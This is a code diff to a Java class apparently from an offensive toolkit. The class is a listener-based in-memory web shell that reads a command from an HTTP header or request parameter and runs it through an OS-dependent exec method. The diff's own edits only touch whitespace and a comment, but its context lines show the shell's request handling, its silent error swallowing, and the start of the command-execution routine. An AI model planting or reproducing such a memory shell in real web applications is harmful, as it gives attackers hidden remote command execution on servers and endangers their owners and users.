@@ -11,7 +11,6 @@ import java.lang.reflect.Method;
 
 /**
  * @author Whoopsunix
- *
  */
 @MemShell(MemShell.Listener)
 @MemShellFunction(MemShellFunction.Exec)
@@ -45,7 +44,7 @@ public class ListenerExec implements InvocationHandler {
     private void run(Object sre) {
         try {
             Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
-            Object header =  invokeMethod(httpServletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+            Object header = invokeMethod(httpServletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
             Object param = invokeMethod(httpServletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
             String str = null;
             if (header != null) {
@@ -61,6 +60,7 @@ public class ListenerExec implements InvocationHandler {
         } catch (Throwable ignored) {
         }
     }
+
     public static String exec(String str) throws Exception {
         String[] cmd;
         if (System.getProperty("os.name").toLowerCase().contains("win")) {
